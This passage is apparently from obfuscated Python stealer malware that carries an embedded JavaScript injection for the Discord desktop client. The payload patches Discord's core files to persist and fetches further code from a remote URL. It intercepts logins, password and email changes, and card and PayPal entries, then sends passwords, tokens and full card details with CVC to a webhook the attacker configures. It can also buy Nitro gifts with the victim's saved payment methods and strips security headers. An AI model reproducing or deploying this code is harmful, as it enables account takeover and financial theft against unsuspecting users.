 - Token           : {VRQWOIIBAJBOMIAZHMITVVEVBRDRKWYLTUZFSFHXFLGRXQZFJEPVLISXIWYHXNAXIA_d15c0rd}
 - Username        : {XLFDGYNOACYCUDTIWZUWBEUCYUVYVVPHGQVLHKNSCEIPXRHDSMLNIYKLRVSRVIZKTF}
 - Display Name    : {CLNOJHOKMFJWGRDEPQOLXWOKSQIYMZMQTVHBPBSNPLNGGUGECDXNUZILNIGUUIMKNUKGGECNDFTISIHXQSOQVSI}
 - Id              : {RDRCZZEXXXOKGATPFXYKERVIEWBVTRQWKFZXBSZMUCFSASWBQVM}
 - Email           : {HREGEDORVKVPWYARXLBSCZWHSAKFEBOYXTWCEJAMSHVFRAHROTOSWYIVWTJJCZZZZJOUVMTUCATMYCXKJQNRPJSL}
 - Email Verified  : {CAWRPCBILDSRCKCOVUXETFVDMRTSVRYULMHENNCFBJTSXBSBQAAFSLFAMRWOHEBWBKFOWEOKWRIIITQDXAQFMOD}
 - Phone           : {FASZFCJIZZPRFTVFXWSURAMQGNLDUMLLZTUDZABFOODAOPHGBRJPNMEIRWG}
 - Nitro           : {FLZNMIHOOBFFHPZMAMZJBKZXBXPORVNZPSDHYTKQMKEHPNTTJOBJVKKPGSYJRGSLRXUXNHISJPRFMLMIKKQRYWZZRMDUZVONIWO}
 - Language        : {STLAPCPIOUTKESQZGSPXULGSHPKSHMNTOOQITKCEBQKLVUVZXCECTCZDXJPZSKOYIEEEYV}
 - Billing         : {AMTALEJMDKZJJEXWFBWANFPBHAYYFOHWVKYYYQRBVGJUSDVWEAONXSJXVVREXSARFT}
 - Gift Code       : {FZAVDQHQKBTTROHCVFKRQBOSVZBFBLIQFUDNPOXXIEZNWHXDBYCDGMYHEQLXHLAKHHTEJJPP}
 - Profile Picture : {GQSWTSDPXCSSMVNVHJIVYFXSTRTAUOYDTFVUBWNJNGRDZBMNLTXCUHWQMHSXDGIITPYNVFHMYSCEVGQXHSNWVRVO}
 - Multi-Factor Authentication : {NSEHVSFFMKFHNUBARROXHEZBEEMSQWQCMAXNYWMLDBCIRIOTONKVBJCODOZTHZPW}
"""
    TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr(f"Discord Accounts ({PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG}).txt", ASIVVNHMWZLBZIALNFLTPPYJILMEDRNSYXIZOBUPXNCJVSJLBNLWGBECOUQFTGJGJDHB)

    return PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG

TZSEWBVYRLZCRXXISSRADCZGADVLXGRJMWUUVSADAYLHYQQKZPOFUMHHMLMUEIYMUFRHSUGSQVKOSBR = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def PRRHVKIGAMSJHSPNATIKJLTQDEZDFFWEZRKDSJTZTXYELWPWPMNQAGM():
    import os
    import re
    import subprocess
    import psutil

    HCOOUFPOBBVYXEFSQDSYLNXDJQKFYQREPQZWWACWAJVNHOHBROCSGBYZVC = "Active"

    def JPFZVZVKZXLBEGPZFZISTCZHUIMLRWETVAUETSJWEDYYUOZNOIWQBRWZMRNJABRPDXNYJPXQLNVGVUPSFG(DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE):
        for v4r_file in os.listdir(DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE):
            if re.search(r'app-+?', v4r_file):
                MYRAQOYMWIYXPWFNWRHWXSRGVHRSDMHCBIHMITTGQSYIAKTYAX = DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE + '\\' + v4r_file + '\\modules'
                if not os.path.exists(MYRAQOYMWIYXPWFNWRHWXSRGVHRSDMHCBIHMITTGQSYIAKTYAX):
                    continue
                for v4r_file in os.listdir(MYRAQOYMWIYXPWFNWRHWXSRGVHRSDMHCBIHMITTGQSYIAKTYAX):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        GFOAOXWUJMMEWBKGYNSVIVEWUYUUQALDTKSBLLCZQHTFCJOQDPHWXG = MYRAQOYMWIYXPWFNWRHWXSRGVHRSDMHCBIHMITTGQSYIAKTYAX + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return GFOAOXWUJMMEWBKGYNSVIVEWUYUUQALDTKSBLLCZQHTFCJOQDPHWXG, v4r_file
        return None

    def VGKVOYXMYHEYLAEWLVAGJGXJCRFIIXMVNXLCTSYHIZHISASGBBIZFHREFDUAZP(DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE):
        NZTNSLCUZRRLMSWUDIIVEQDTQOOVGTAAGWTPTHRYNIIPGULXAVSVINHJWPWCHOJLJVKBPO = DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE + '\\Update.exe'
        CHYSWNJQYQGGXOLVWXXCEUGGZMRJUYWBFVYAHYCHQUNMZMBBRLKUSWWDFASHJWGOYZEEYVUGQAUGCQK = DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE):
            if re.search(r'app-+?', v4r_file):
                JKBQEJWGFEKSELWVMDUCYFXMUBNOZOJBBCJIWDORYKJWWMUIAOPJGJAQW = DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE + '\\' + v4r_file
